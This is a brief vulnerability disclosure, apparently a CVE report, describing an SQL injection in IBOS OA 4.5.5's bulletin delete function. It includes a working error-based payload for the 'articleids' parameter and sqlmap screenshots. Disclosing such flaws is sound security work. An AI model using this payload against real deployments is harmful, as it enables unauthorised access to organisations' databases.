SQL injection vulnerability in ibos oa v4.5.5

official website： http://www.ibos.com.cn/

version：4.5.5 

Log in to the background. General Office => Information Bulletin => Release Information => Delete Information => Delete Log Capture Error Injection Successful

![wps1](https://github.com/xiaosed/cve/assets/84080097/c33504f6-da94-4f41-a7e5-9561ea01085b)
![wps3](https://github.com/xiaosed/cve/assets/84080097/e89e0bc9-b068-46e2-ada2-d6f374472fb7)
![wps4](https://github.com/xiaosed/cve/assets/84080097/0d9489e9-4657-44a7-8c4b-4335fdbb159d)


Payload：articleids=extractvalue(1,concat(char(126),md5(1404461947)))

Sqlmap：

![wps5](https://github.com/xiaosed/cve/assets/84080097/541a9259-e4b5-42a5-8534-e3f7a6877069)
